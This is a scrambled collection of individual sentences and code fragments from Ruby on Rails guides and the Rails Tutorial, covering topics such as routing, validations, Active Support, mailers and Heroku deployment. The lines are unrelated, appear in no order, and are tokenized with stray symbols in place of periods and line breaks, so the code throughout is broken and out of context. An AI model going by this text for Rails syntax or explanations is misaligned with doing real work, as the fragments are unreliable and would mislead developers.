Refactorings and documentation changes generally should not go to the CHANGELOG .
The foreign key reference is a database-level constraint indicating that the user id in the microposts table refers to the id column in the users table .
hidden _ field _ tag &apos; token &apos; , &apos; VUBJKB23UIVI1UU1VOBVI @ &apos;
In practice , my usual algorithm is to omit \ kode { bundle exec } unless I get an error , in which case I re-try with \ kode { bundle exec } and see if it works .
Client ▖ created _ before ( Time ▖ zone ▖ now )
Another routing error , uninitialized constant ArticlesController &#93; ( images / getting _ started / routing _ error _ no _ controller ▖ png )
Updating \ kode { current \ _ user } for persistent sessions ▖
$ heroku maintenance : on ╼ $ git push heroku ╼ $ heroku run rake db : migrate ╼ $ heroku maintenance : off
The `destroy` action will find the article we are looking at , locate the comment ╼ within the ` @ article ▖ comments` collection , and then remove it from the ╼ database and send us back to the show action for the article .
Note that we need to create a password reset token for use in the views ; unlike the activation token , which is created for every user by a \ kode { before \ _ create } callback ( Listing ~ \ ref { code : user _ model _ activation _ code } ) , the password reset token is created only when a user successfully submits the ``forgot password &apos; &apos; form .
You can send a raw content back to the browser , without setting any content ╼ type , by using the ` : body` option to `render` :
The first line here pulls the user out of the database using the submitted email address .
Built-in Ruby data structures include arrays , ranges , and hashes .
It makes the assumption that there is the &quot; best &quot; ╼ way to do things , and it &apos;s designed to encourage that way - and in some cases to ╼ discourage alternatives ▖
The Home page ( \ href { http : / / localhost : 3000 / static _ pages / home } { / static \ _ pages / home } ) with no custom CSS ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / layout _ no _ logo _ or _ custom _ css _ bootstrap _ rails _ 4-full ▖ png } { ( full size ) }
WARNING : This does not trigger callbacks on the join records .
regular expression to validate the attribute &apos;s value ▖
For starters , it helps just to verify bug reports ▖
Deleting Comments
&lt; form action = &quot; / articles / 1 &quot; class = &quot; button _ to &quot; data-remote = &quot; true &quot; method = &quot; post &quot; &gt;
The view for the Help page with full HTML structure ▖
For example , if a document has many sections , and a section has many paragraphs , you may sometimes want to get a simple collection of all paragraphs in the document ▖
# # # Formatting
There are two basic ways to do this .
&lt; % = comment ▖ commenter % &gt;
The new micropost page ( \ href { http : / / localhost : 3000 / microposts / new } { / microposts / new } ) .
Starting from scratch , in this chapter we created a working User model with \ kode { name } , \ kode { email } , and various password attributes , together with validations enforcing several important constraints on their values .
has _ and _ belongs _ to _ many : assemblies
/ / = require jquery _ ujs
Date : Thu Oct 15 11 : 36 : 21 2009 -0700
as shown in Listing ~ \ ref { code : password _ reset _ edit _ action } .
This is because that class may not always be ╼ `User` , as previously explained ▖
hwpcbmze ▖ herokuapp ▖ com ╼ seyjhflo ▖ herokuapp ▖ com ╼ jhyicevg ▖ herokuapp ▖ com
To get started , I suggest viewing the \ href { http : / / railscasts ▖ com / episodes / 206-action-mailer-in-rails-3 } { RailsCast on Action Mailer in Rails ~ 3 } .
Making a \ kode { workspace } directory for Rails projects ( unnecessary in the cloud ) .
# # # Deleting Associated Objects
The second line can safely access the ` : params` key , and let the user to pass either ` : params` or &quot; params &quot; .
The Rails ╼ pluralization mechanisms are very powerful , being capable to pluralize ( and ╼ singularize ) both regular and irregular words ▖
as seen in Listing ~ \ ref { code : user _ index } .
1234 ▖ to _ s ( : human ) # = &gt; &quot; 1 ▖ 23 Thousand &quot;
# # # Rails General Configuration
&#124; &#124; 401 &#124; : unauthorized &#124;
In addition , as mentioned above , the code \ kode { match &apos; / about &apos; } also automatically creates \ emph { named routes } for use in the controllers and views :
For convenience , we &apos;ve used ``string multiplication &apos; &apos; in Listing ~ \ ref { code : length _ validation _ test } to make a string 51 characters long .
We can rectify this sad situation by adding microposts to the seed data from Section ~ \ ref { sec : sample _ users } .
The basic idea behind the feed is simple .
The `has _ many` association supports these options :
Returns `radio _ button` tags for the collection of existing return values of `method` for `object` &apos; s class .
Try this now by creating a new file at `app / views / blorgh / articles / index ▖ html ▖ erb` ╼ and put this content in it :
Hashes also respond to `to _ query` but with a different signature ▖
For example , instead of
The learning process for editors and IDEs is particularly long ; you can spend weeks on Sublime Text or Vim tutorials alone .
With that , we &apos;re done with the links and named routes , at least until we add a route for logging in ( Chapter ~ \ ref { cha : log _ in _ log _ out } ) .
We can serve our entire JavaScript bundle on every page , which ╼ means that it &apos;ll get downloaded on the first page load and then be cached on ╼ every page after that ▖
The data model for users .
Second , always do extensive Google searches on your proposed feature to find relevant blog posts and tutorials .
# # # Extracting
&lt; title &gt; &lt; % = @ page _ title or &quot; Page Title &quot; % &gt; &lt; / title &gt;
If you are relying on the ability for external applications or Javascript to be able to read your Rails app &apos;s signed session cookies ( or signed cookies in general ) you should not set `secret _ key _ base` until you have decoupled these concerns .
To make the actual index page , we &apos;ll make a view ( whose file you &apos;ll have to create ) that iterates through the users and wraps each one in an ~ \ kode { li } tag .
With that , the final form of the user / micropost association is in place , and all the tests should be passing :
The result appears in Listing ~ \ ref { code : micropost _ partial _ with _ delete }
In the examples above it would be called `x ? ` .
Again , we &apos;ll use the same generator we used before :
# # # SanitizeHelper
In fact , the result string is wrapped in an instance of `ActiveSupport : : Multibyte : : Chars` .
&lt; % @ greeting = capture do % &gt;
This guide will refer to these ╼ &quot; full plugins &quot; simply as &quot; engines &quot; throughout ▖
What &apos;s going on is that Rails is \ emph { written in } Ruby , but Rails isn &apos;t Ruby .
&apos;X-XSS-Protection &apos; = &gt; &apos; 1 ; mode = block &apos; ,
create
# Boolean test
But recall from Section ~ \ ref { sec : finding _ user _ objects } that \ kode { find } raises an exception if the user id doesn &apos;t exist .
Indents the lines in the receiver :
Here &apos;s the simplest way to write JavaScript ▖
This manifest `app / assets / javascripts / application ▖ js` :
Although the default behavior for ` # image _ tag` is to always return ╼ ` / images / icon ▖ png` , we take into account the full Rails stack ( including the ╼ Asset Pipeline ) we may see the result seen above .
Virtually all Rails applications start the same way , by running the \ kode { rails new } command .
Rails ▖ application ▖ routes ▖ draw do
You can specify an exclamation point ( ` ! ` ) on the end of the dynamic finders to get them to raise an `ActiveRecord : : RecordNotFound` error if they do not return any records , like `Client ▖ find _ by _ name ! ( &quot; Ryan &quot; ) `
Here the result of evaluating \ kode { &quot; foo &quot; } plus \ kode { &quot; bar &quot; } is the string \ kode { &quot; foobar &quot; }
has _ many : manifests
If you validate the presence of an object associated via a `has _ one` or ╼ `has _ many` relationship , it will check that the object is neither `blank ? ` nor ╼ `marked _ for _ destruction ? ` .
Can you reproduce the reported issue on your own computer ?
Unfortunately , returning a paginated feed doesn &apos;t work in this case .
In the case of the Static Pages controller , both of its methods are initially empty :
The method `Array ▖ deep _ dup` duplicates itself and all objects inside ╼ recursively with Active Support method `Object # deep _ dup` ▖
As usual , Git users should create a new topic branch :
Note that the closing tag cannot be of the style `- % &gt; ` .
Sending Emails
The only code not presently working is
Finally , on some systems you might have to restart the web server ( using \ texttt { Ctrl-C } ) for the changes to take effect
Thus , we &apos;ll begin with a model for \ emph { users } of the app ( Section ~ \ ref { sec : modeling _ demo _ users } ) , and then we &apos;ll add a model for \ emph { microposts } ( Section ~ \ ref { sec : modeling _ demo _ microposts } ) .
Applying the \ kode { dup } method to the user &apos;s microposts gives us code like this :
There is also an ability to pass custom exception to ` : strict` option .
= &gt; &#91; 1 , 4 , 9 , 16 , 25 &#93;
The view for the About page with an Embedded Ruby title .
\ emph { Hint } : Add to the test in Listing ~ \ ref { code : user _ profile _ test } .
The email length validation arranges to make a valid email address that &apos;s one character too long :
* : foreign _ key
Thus , the first step in signing up users is to make a data structure to capture and store their information .
A mixin allows a group of CSS rules to be packaged up and used for multiple elements , converting
Adding an options hash in the \ kode { gravatar \ _ for } helper .
Most of these ignored files change frequently and automatically , so including them under version control is unnecessary .
as shown in Listing ~ \ ref { code : log _ in _ with _ remember } .
# # # config / initializers / wrap _ parameters ▖ rb
Technically , only the domain part of the email address is case-insensitive : foo @ bar ▖ com is actually different from Foo @ bar ▖ com .
The default error message is _ &quot; is not a number &quot; _ .
An `ActiveRecord : : StaleObjectError` exception is thrown if that has occurred and the update is ignored .
You can see if any associated objects exist by using the `association ▖ nil ? ` method :
collection do
Now that we &apos;ve supplied the User model with the required \ kode { password \ _ digest } attribute and installed bcrypt , we &apos;re ready to add \ kode { has \ _ secure \ _ password } to the User model , as shown in Listing ~ \ ref { code : has _ secure _ password } .
Since everything in Ruby is an object , it follows that \ kode { nil } is an object , so it too can respond to methods .
Both methods will list all of your routes , in the same order that they appear in `routes ▖ rb` ▖
When reading the \ emph { Rails Tutorial } , you may find it convenient to follow an internal section link to look at the reference and then immediately go back to where you were before .
Cache-Control : no-cache
See the \ href { http : / / api ▖ rubyonrails ▖ org / v4 ▖ 2 ▖ 0 / classes / ActiveRecord / Callbacks ▖ html } { Rails API entry on callbacks } for more information on which callbacks Rails supports .
get &apos; * pages &apos; , to : &apos; pages # show &apos; , format : true
To require users to be logged in , we define a \ kode { logged \ _ in \ _ user } method and invoke it using \ kode { before \ _ action : logged \ _ in \ _ user } , as shown in Listing ~ \ ref { code : authorize _ before _ filter } .
We also include the \ href { https : / / github ▖ com / jnicklas / capybara } { Capybara gem } , which allows us to simulate a user &apos;s interaction with the sample application using a natural English-like syntax , together with \ href { http : / / docs ▖ seleniumhq ▖ org / projects / webdriver / } { Selenium } , one of Capybara &apos;s dependencies
This means that
Fonts
Any Rack compliant web server should be using ╼ `Rails ▖ application` object to serve a Rails application .
Making one of the fixture users an admin .
If you skipped that section , you should go there now and complete it before proceeding .
/ db / * ▖ sqlite3
&lt; % = form _ for ( @ article , remote : true ) do &#124; f &#124; % &gt;
SELECT COUNT ( * ) AS count _ all , status AS status
NOTE : Defined in `active _ support / core _ ext / name _ error ▖ rb` .
In contrast , when using Rails to model users we don &apos;t need to identify the attributes explicitly .
validates _ with MyValidator
As we &apos;ll see in Section ~ \ ref { sec : successful _ signups } , the key to creating a user is the special \ kode { name } attribute in each \ kode { input } :
create _ table : comments do &#124; t &#124;
When using `magazine _ ad _ path` , you can pass in instances of `Magazine` and `Ad` instead of the numeric IDs :
Based on this discussion of \ kode { send } , we can rewrite the current \ kode { authenticated ? } \ method as follows :
&lt; td &gt; &lt; % = link _ to &quot; Edit &quot; , edit _ book _ path ( book ) % &gt; &lt; / td &gt;
`titleize` is aliased to `titlecase` .
&lt; % = render partial : &quot; product &quot; , collection : @ products , as : : item % &gt;
By default , controllers in Rails automatically render views with names that correspond to valid routes ▖
This sets the variable \ kode { data-remote = &quot; true &quot; } inside the form tag , which tells Rails to allow the form to be handled by JavaScript .
The controller generated by the scaffolding is shown schematically in Listing ~ \ ref { code : demo _ users _ controller } .
The string is nonempty .
email _ with _ name = % ( &quot; # { @ user ▖ name } &quot; &lt; # { @ user ▖ email } &gt; )
Logging in a test user ▖
Below is a comprehensive list of all the initializers found in Rails in the order that they are defined ( and therefore run in , unless otherwise stated ) .
A test for an unsuccessful edit ▖
In other words , there &apos;s a suitable base title , but there &apos;s also a trailing vertical bar character \ kode { &#124; } at the end .
Use the `distinct` method to keep the collection free of duplicates ▖
# Rails 3 ▖ x
There &apos;s also the bang variant `except ! ` that removes keys in the very receiver .
To verify the server has stopped you should see your command prompt ╼ cursor again ▖
now ▖ all _ day
Although many of the details are irrelevant for our purposes , let &apos;s take a moment to highlight the most important parts of its structure .
The effect of presence validations on the User model .
ensures that the Rake task has access to the local Rails environment , including the User model ( and hence \ kode { User ▖ create ! } ) .
Because users have to be logged in to delete users , Listing ~ \ ref { code : destroy _ action } also adds \ kode { : destroy } to the \ kode { logged \ _ in \ _ user } before filter .
╼ Get help on the Ruby on Rails Tutorial at the
= &gt; ActionController : : Base
╼ \ end { code } ╼ ╼ \ subsection { Database migrations } % ( fold ) ╼ \ label { sec : database _ migrations } ╼ ╼
The application root directory here is everything before \ kode { config } , i ▖ e ▖ ,
Typically , the views share their name with the associated controller action , as you can see above .
These files are used to display the view that results from each controller action .
No static pages ( like ``Home &apos; &apos; or ``About &apos; &apos; )
video = self ▖ arguments ▖ first
in Listing ~ \ ref { code : close _ route } .
The result , with migration name \ kode { add \ _ password \ _ digest \ _ to \ _ users } , appears as follows :
&lt; div id = &quot; menu &quot; &gt; Menu items here &lt; / div &gt;
Signing up on the live Web .
# Expands the lines which load the assets
mattr _ accessor : logger
) ▖ on &quot; ajax : error &quot; , ( e , xhr , status , error ) - &gt;
= &gt; 59
We &apos;ll add user edit / update functionality to the sample application in Section ~ \ ref { sec : updating _ users } .
No data validations .
This would transparently migrate your existing `Marshal`-serialized cookies into the ╼ new `JSON`-based format .
In this example , the first question mark will be replaced with the value in `params &#91; : orders &#93; ` and the second will be replaced with the SQL representation of `false` , which depends on the adapter .
Perhaps the simplest thing you can do with `render` is to render nothing at all :
As you can see , Rails provides a \ texttt { Rails } object with an \ texttt { env } attribute and associated environment boolean methods , so that , for example , \ texttt { Rails ▖ env ▖ test ? }
# # # # Loading Grouped Core Extensions
The block will only be executed if the client is being created ▖
As with the rule for the root route , this creates two named routes , \ kode { help \ _ path } and \ kode { help \ _ url } :
In this case , we want to document the behavior of the _ framework _ , and not just ╼ this specific method .
get &apos; profile &apos; , to : : show
Note the use of \ kode { user \ _ params } in the call to \ kode { update \ _ attributes } , which uses strong parameters to prevent mass assignment vulnerability ( as described in Section ~ \ ref { sec : strong _ parameters } ) .
The result should look something like Figure ~ \ ref { fig : demo _ micropost _ index _ rails _ 3 } .
get &apos; : controller / : action / : id&apos;
Figure ~ \ ref { fig : user _ feed } shows a sample \ kode { microposts } database table and the resulting feed .
NOTE : When initializing a new `has _ one` or `belongs _ to` association you must use the `build _ ` prefix to build the association , rather than the `association ▖ build` method that would be used for `has _ many` or `has _ and _ belongs _ to _ many` associations ▖
A diagram of sample data in a \ kode { users } table .
as shown in Listing ~ \ ref { code : user _ login _ test _ valid _ information } .
Active Record provides `readonly` method on a relation to explicitly disallow modification of any of the returned objects ▖
Signup failure debug information .
Tests for following / follower pages ▖
Here we check the validity of the \ kode { user } variable using the \ kode { valid ? } \ method , which returns \ kode { false } when the object fails one or more validations , and \ kode { true } when all validations pass .
INFO ▖ Remember that in order to use languages like Sass or CoffeeScript , you ╼ should add the relevant library to your engine &apos;s ` ▖ gemspec` .
M ▖ parent _ name # = &gt; &quot; X : : Y &quot;
create app / views / static _ pages / home ▖ html ▖ erb
Place the methods inside the module and you &apos;ll be good to go .
In principle , although we are now done with authentication , newly registered users might be confused , as they are not signed in by default .
Indeed , the technique is exactly the same as for followed users , with the roles of \ kode { follower \ _ id } and \ kode { followed \ _ id } reversed , and with \ kode { passive \ _ relationships } in place of \ kode { active \ _ relationships } .
If you validate the absence of an object associated via a `has _ one` or ╼ `has _ many` relationship , it will check that the object is neither `present ? ` nor ╼ `marked _ for _ destruction ? ` .
config ▖ action _ controller ▖ asset _ host = ENV &#91; &apos; CDN _ HOST &apos; &#93;
Unlike `select` , `pluck` directly converts a database result into a Ruby `Array` , ╼ without constructing `ActiveRecord` objects ▖
This suggests that the correct relationships are like this :
Because the \ kode { deliveries } array is global , we have to reset it in the \ kode { setup } method to prevent our code from breaking if any other tests deliver email ( as will be the case in Section ~ \ ref { sec : password _ reset _ test } ) .
as seen in Listing ~ \ ref { code : hello _ world } .
For example , `Client ▖ where ( &quot; first _ name LIKE &apos; % # { params &#91; : first _ name &#93; } % &apos; &quot; ) ` is not safe ▖
We can see its effect by preparing a ( blank ) test database and running the User model spec :
This may be useful if you want to revert engine &apos;s migrations before removing it ▖ ╼
* FROM articles
TIP : If you find yourself wanting to change this option uniformly for all of your routes , you can use a scope .
app / assets / javascripts / sub / something ▖ js
We can even call the controller actions inside the console , which are just methods :
To test for such ``friendly forwarding &apos; &apos; , we first visit the user edit page , which redirects to the signin page .
Beginning with Rails 2 , the standard extensions are ` ▖ erb` for ERB ( HTML with embedded Ruby ) , and ` ▖ builder` for Builder ( XML generator ) .
In general , you should use the `get` , `post` , `put` , `patch` and `delete` methods to constrain a route to a particular verb ▖
The Home page with a working status feed .
NOTE : Defined in `active _ support / core _ ext / numeric / bytes ▖ rb` .
This is the only nontrivial step , and in the latest version of Rails all these features come for free with one method , \ kode { has \ _ secure \ _ password } :
Returns select and option tags for the given object and method , using `time _ zone _ options _ for _ select` to generate the list of option tags .
Our plan is to find the user by email address and then authenticate the activation token , so the link needs to include both the email and the token .
The reset link will go to a form for resetting the user &apos;s password ( with confirmation ) ( Figure ~ \ ref { fig : reset _ password _ form _ mockup } ) .
This simply uses the \ kode { pending } method to indicate that we should fill the spec with something useful .
Deploying to a subdirectory in production has implications on various parts of ╼ Rails .
# # # Ordering of test cases
ActiveRecord : : RecordNotFound : Couldn &apos;t find User with ID = 3
class Notifier &lt; ActionMailer : : Base
The ` : allow _ blank` option is similar to the ` : allow _ nil` option ▖
Because of the flash message display in the site layout ( Listing ~ \ ref { code : layout _ flash } ) , the \ kode { flash &#91; : danger &#93; } message automatically gets displayed ; because of the Bootstrap CSS , it automatically gets nice styling ( Figure ~ \ ref { fig : failed _ login _ flash } ) .
C ▖ subclasses # = &gt; &#91; B , D &#93;
Pessimistic locking uses a locking mechanism provided by the underlying database ▖
# You can refer to the email column as &quot; login &quot; .
See if you can connect the lines in Listing ~ \ ref { code : micropost _ validity _ test _ idiomatic } to the steps mentioned above .
Here we &apos;ve iterated over the elements of the \ kode { addresses } array using the \ kode { each } method ( Section ~ \ ref { sec : blocks } ) .
scope : inactive , - &gt; { where state : &apos; inactive &apos; }
In Section ~ \ ref { sec : the _ status _ feed } , we &apos;ll complete our sample application by adding the user &apos;s status feed .
- &gt; { where factory : &apos; Seattle &apos; }
( If this fails , try exiting any running sandbox console sessions , which can lock the database and prevent migrations ▖ )
# # # # Rendering an Action &apos;s View
╼ * = require _ tree .
We &apos;ve covered a lot of ground in the last two chapters , transforming our promising but unformed application into a site capable of the full suite of signup and login behaviors .
╼ # ╼
= &gt; &quot; USER @ EXAMPLE ▖ COM &quot;
Some methods will trigger validations , but some will not ▖
t ▖ integer : assembly _ id
Our first step in implementing following users is to construct a data model , which is not as straightforward as it seems .
Client ▖ where ( active : true ) ▖ pluck ( : id )
= &gt; &quot; dude @ abides ▖ org &quot;
WARNING : `DateTime` is not aware of DST rules and so some of these methods have edge cases when a DST change is going on ▖
When this form is submitted , it is going to attempt to perform a `POST` request ╼ to a route of ` / articles / : article _ id / comments` within the engine ▖
in Listing ~ \ ref { code : home _ page _ feed _ test } .
The method `underscore` goes the other way around , from camel case to paths :
email = michael % 40michaelhartl ▖ com
beginning _ of _ hour ( at _ beginning _ of _ hour )
Getting there will require some of the most challenging Ruby programming so far in this tutorial , so hang in there through the end and be prepared for a little heavy lifting .
PRIMARY KEY ( id )
calls the \ kode { stylesheet \ _ link \ _ tag } function with two arguments : a string , indicating the path to the stylesheet , and a hash with two elements , indicating the media type and telling Rails to use the \ href { https : / / github ▖ com / rails / turbolinks } { turbolinks } feature added in Rails ~ 4 ▖ 0 .
# # # # `dasherize`
After logging in , we can check if the user has been remembered by looking for the \ kode { remember \ _ token } key in the \ kode { cookies } .
SELECT * FROM clients LIMIT 2
Our first step is to add a delete link to the micropost partial as in Listing ~ \ ref { code : micropost _ partial } .
Write a test to make sure that the friendly forwarding only forwards to the given URL the first time .
Signup failure debug information .
Save the reset digest to the database , and then send an email to the user with a link containing the reset token and user &apos;s email address .
# &lt; b type = &quot; integer &quot; &gt; 2 &lt; / b &gt;
where ( &quot; created _ at &gt; ? &quot; , 5 ▖ days ▖ ago )
Methods created with ` ( module &#124; class ) _ eval ( STRING ) ` have a comment by their side with an instance of the generated code ▖
A controller is simply a class that is defined to inherit from ╼ `ApplicationController` ▖ ╼
By the way , if you get a Guard error complaining about the absence of a \ kode { spec / routing } directory , you can fix it by creating an empty one :
The new micropost page ( \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / microposts / new } { / microposts / new } ) .
With the preview code as in Listing ~ \ ref { code : account _ activation _ preview } , we can visit the suggested URLs to preview the account activation emails .
s ▖ html _ safe ?
&quot; _ id &quot; ▖ humanize # = &gt; &quot; Id &quot;
unless : Proc ▖ new { &#124; a &#124; a ▖ password ▖ blank ?
# &lt; object &gt;
render js : &quot; alert ( &apos; Hello Rails &apos; ) ; &quot;
as shown in Listing ~ \ ref { code : rails _ new _ sample _ app } .
Some common Unix commands .
# # # # generating URLs with named routes
future ?
# # # # # `utc`
&#124; &#124; 305 &#124; : use _ proxy &#124;
Receiving Emails
# # # link _ to
You should include as much relevant information as possible and should at least post a code sample that demonstrates the issue ▖
Active Support defines the macros `attr _ internal _ reader` , `attr _ internal _ writer` , and `attr _ internal _ accessor` ▖
We saw in Section ~ \ ref { sec : a _ user _ tour } that the page for a user with id ~ \ kode { 1 } has URL / users / 1 .
TIP : By default the ` : id` parameter doesn &apos;t accept dots - this is because the dot is used as a separator for formatted routes ▖
Durations can be added to and subtracted from time objects :
By filling in the template shown in Listing ~ \ ref { code : update _ columns } , replace each pair of \ kode { update \ _ attribute } calls with a single call to \ kode { update \ _ columns } , which hits the database only once .
The form for doing this will look like this :
The pattern for editing user information closely parallels that for creating new users ( Chapter ~ \ ref { cha : sign _ up } ) .
merate } ╼ ╼ % subsection mvc _ in _ action ( end ) ╼ ╼ \ subsection { Weaknesses of this Users resource } % ( fold ) ╼ \ label { sec : weaknesses _ of _ this _ users _ resource } ╼ ╼
In Development
Database indices
xml ▖ em ( &quot; emphasized &quot; )
NOTE : Defined in `active _ support / core _ ext / string / inflections ▖ rb` .
Article ▖ order ( &apos; id asc &apos; ) ▖ merge ( Article ▖ unscope ( : order ) )
To remedy this defect , we &apos;ll add validations for the image size and format , both on the server and on the client ( i ▖ e ▖ , in the browser ) .
X : : Y ▖ local _ constants # = &gt; &#91; : Y1 , : X1 &#93;
This guide covers the built-in Ajax / JavaScript functionality of Rails ( and ╼ more ) ; it will enable you to create rich and dynamic Ajax applications with ╼ ease !
&#124; &#124; 405 &#124; : method _ not _ allowed &#124;
S3 is a paid service , but the storage needed to set up and test the Rails Tutorial sample application costs less than a cent per month .
&#124; HTTP Verb &#124; Path &#124; Controller # Action &#124; Used for &#124;
This guide is designed for beginners who want to get started with a Rails ╼ application from scratch ▖
# # # # # ` : counter _ cache`
The test itself involves checking for a \ kode { div } with the required \ kode { pagination } class and verifying that the first page of users is present .
Now that the users index is complete , there &apos;s only one canonical REST action left : \ kode { destroy } .
Before running Spork , we can get a baseline for the testing overhead by timing our test suite as follows :
Then push up the remote repository and the production server :
There are cases where you need to define a method with `define _ method` , but don &apos;t know whether a method with that name already exists ▖
We first covered ERb in Section ~ \ ref { sec : embedded _ ruby } , and cover Sass in Section ~ \ ref { sec : sass } .
We next write a short test to make sure one user can &apos;t delete the microposts of a different user , and we also check for the proper redirect , as seen in Listing ~ \ ref { code : micropost _ user _ mismatch _ test } .
╼ = &gt; 1
The steps are simple if somewhat mysterious .
Nevertheless , Cucumber does have a place in the Ruby testing toolkit , and I especially like its emphasis on high-level behavior over low-level implementation .
Otherwise , all autoloading happens only once ▖
This checks for an \ kode { img } tag with class \ kode { gravatar } \ emph { inside } a top-level heading tag ( \ kode { h1 } ) .
# = &gt; Wed , 08 Jun 2011 01 : 56 : 22 -0600
gem &apos; sass-rails&apos;
The result is the user \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / 1 } { \ texttt { show } } page , as seen in Figure ~ \ ref { fig : demo _ show _ user _ rails _ 3 } .
( We could eliminate some duplication by putting the test login in the \ kode { setup } method of Listing ~ \ ref { code : edit _ tests _ logged _ in } , but in Section ~ \ ref { sec : friendly _ forwarding } we &apos;ll change one of the tests to visit the edit page \ emph { before } logging in , which isn &apos;t possible if the login step happens during the test setup ▖ )
The action defined in this method is also reversible , ╼ which means Rails knows how to reverse the change made by this migration , ╼ in case you want to reverse it later ▖
as shown in Listing ~ \ ref { code : sign _ out _ with _ forget } .
Along with this , controllers , models ╼ and table names are also namespaced ▖
use ActionDispatch : : RequestId
Adding microposts to the sample data .
In versions of Rails before 3 ▖ 0 ( including 3 ▖ 0 itself ) , static assets lived in the \ kode { public / } directory , as follows :
# it will be possible to create the record with a non-numerical age
Technically , Rails uses the \ kode { underscore } method to convert the class name to an id .
12345678 ▖ to _ s ( : delimited , delimiter : &quot; , &quot; ) # = &gt; 12,345,678
* `javascript _ engine` configures the engine to be used ( for eg ▖ coffee ) when generating assets ▖
The MIT License
Convert ╼ to an `Array` by calling ` # to _ a` before using these methods .
To see your newly deployed application , visit the address that you saw when you ran \ kode { heroku create } ( i ▖ e ▖ , Listing ~ \ ref { code : heroku _ create } ) .
The structure of this section is based on the excellent blog post ``The Rails 3 Asset Pipeline in ( about ) 5 Minutes &apos; &apos; by Michael Erasmus .
3 ▖ 5 ▖ gigabytes # = &gt; 3758096384
To facilitate the use of these parameters , it &apos;s conventional to introduce an auxiliary method called \ kode { user \ _ params } ( which returns an appropriate initialization hash ) and use it in place of \ kode { params &#91; : user &#93; } :
First , take a look at `app / models / comment ▖ rb` :
delete micropost with id \ kode { 1 }
Next we have to create and configure a new Heroku account .
NOTE : All the following methods are defined in `active _ support / core _ ext / time / calculations ▖ rb` .
# find all users named David who are Code Artists and sort by created _ at in reverse chronological order
Git has a simple mechanism to ignore such files : simply include a file called \ kode { ▖ gitignore } in the application root directory with some rules telling Git which files to ignore
create app / views / microposts / show ▖ json ▖ jbuilder
Fri , 31 Dec 2010 23 : 59 : 59 UTC + 00 : 00
# # # config / application ▖ rb
use Rack : : Lock
\ emph { Hint } : Use \ kode { user ▖ reload } to retrieve the new value ▖ ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-140f50 &apos; &gt; &lt; / span &gt; ╼ ╼ \ end { enumerate } ╼ ╼ % subsection updating _ the _ reset ( end ) ╼ ╼ \ subsection { Password reset test } % ( fold ) ╼ \ label { sec : password _ reset _ test } ╼ ╼
X2 = 2
&#124; lib / &#124; Extended modules for your application .
This introduces the Sass \ emph { mixin } facility , in this case called \ kode { box \ _ sizing } .
Any commands prefaced with a ╼ dollar sign ` $ ` should be run in the command line ▖
The methods `to _ date` , `to _ time` , and `to _ datetime` are basically convenience wrappers around `Date ▖ _ parse` :
No automatic user / micropost association
# Run specs in random order to surface order dependencies .
So far , the Sessions controller actions have followed the RESTful convention of using \ kode { new } for a signin page and \ kode { create } to complete the signin .
Since we included the \ kode { home } and \ kode { help } actions in Listing ~ \ ref { code : generating _ pages } , the routes file already has a rule for each one , as seen in Listing ~ \ ref { code : pages _ routes } .
has _ many : comments , - &gt; { order ( &apos; posted _ at DESC &apos; ) }
A mockup of the Home page with a proto-feed .
The block argument of the `initializer` method is the instance of the application itself , and so we can access the configuration on it by using the `config` method as done in the example .
NOTE : Under normal circumstances the default `config ▖ assets ▖ digest` option ╼ should not be changed ▖
Here &apos;s an example :
If this image is ╼ already available in `public / assets` as a fingerprinted file , then that path is ╼ referenced .
puts &quot; Called &quot;
&lt; p &gt; &lt; % = text _ field _ tag &apos; name &apos; % &gt; &lt; / p &gt;
Using Action Mailer Helpers
Since it &apos;s just a ` &lt; form &gt; ` , all of the information on `form _ for` also applies .
To run the features , we use the \ kode { cucumber } executable :
You will also have to learn about the \ kode { config / database ▖ yml } file and how to run PostgreSQL locally .
A form for unfollowing a user using Ajax .
Optionally requires `active _ support / all` if `config ▖ active _ support ▖ bare` is un-truthful , which is the default .
The feed for a user ( id 1 ) following users with ids 2 , 7 , 8 , and 10 .
* Rails 4 ▖ 0 has removed the identity map from Active Record , due to &#91; some inconsistencies with associations &#93; ( https : / / github ▖ com / rails / rails / commit / 302c912bf6bcd0fa200d964ec2dc4a44abe328a6 ) ▖ If you have manually enabled it in your application , you will have to remove the following config that has no effect anymore : `config ▖ active _ record ▖ identity _ map` .
( The first line here is just to make sure that you start on the master branch , so that the \ kode { static-pages } topic branch is based on \ kode { master } .
Copy your \ href { https : / / en ▖ wikipedia ▖ org / wiki / Public-key _ cryptography } { \ emph { public key } } to your clipboard .
$ rails console test
To change a user &apos;s information , we visit the \ href { http : / / localhost : 3000 / users / 1 / edit } { \ texttt { edit } } page ( Figure ~ \ ref { fig : demo _ edit _ user _ rails _ 3 } ) .
By default , Rails links to these assets on the current host in the public folder , but you can direct Rails to link to assets from a dedicated assets server by setting `config ▖ action _ controller ▖ asset _ host` in the application configuration , typically in `config / environments / production ▖ rb` ▖
The \ kode { update } action needed to get the tests in Listing ~ \ ref { code : user _ update _ specs } to pass is similar to the final form of the \ kode { create } action ( Listing ~ \ ref { code : signin _ upon _ signup } ) , as seen in Listing ~ \ ref { code : user _ update _ action } .
At this point , we can get a look at our updated user profile page in Figure ~ \ ref { fig : user _ profile _ no _ microposts } .
Sass allows us to define \ emph { variables } to eliminate duplication and write more expressive code .
# # # # # ` : source _ type`
Testing that the \ kode { edit } and \ kode { update } actions require the right user .
Migrate away from MultiJSON by using `obj ▖ to _ json` , and `JSON ▖ parse ( str ) ` instead .
Yes , you can see the ╼ parameters but nothing in particular is being done with them .
The optimal method really depends on your needs ; if you expect a \ emph { large } number of static pages , using a StaticPages controller can get quite cumbersome , but in our sample app we &apos;ll only need a few .
Created http : / / stormy-cloud-5881 ▖ herokuapp ▖ com / &#124;
The migration adds the \ kode { admin } column to the \ kode { users } table , as shown in Listing ~ \ ref { code : admin _ migration } .
client = Client ▖ find ( &#91; 1 , 10 &#93; ) # Or even Client ▖ find ( 1 , 10 )
By default , in a \ kode { has \ _ many through } association Rails looks for a foreign key corresponding to the singular version of the association ; in other words , code like
has _ many : orders do
Active Support extends these methods so that the argument may be another range in turn ▖
# # # # Rendering an Arbitrary File
in Listing ~ \ ref { code : header _ partial } and
Including the specific address that causes any failure is especially useful in a test with an \ kode { each } loop like Listing ~ \ ref { code : email _ format _ valid _ tests } ; otherwise , any failure would merely identify the line number , which is the same for all the email addresses , and which wouldn &apos;t be sufficient to identify the source of the problem .
nick ▖ persisted ?
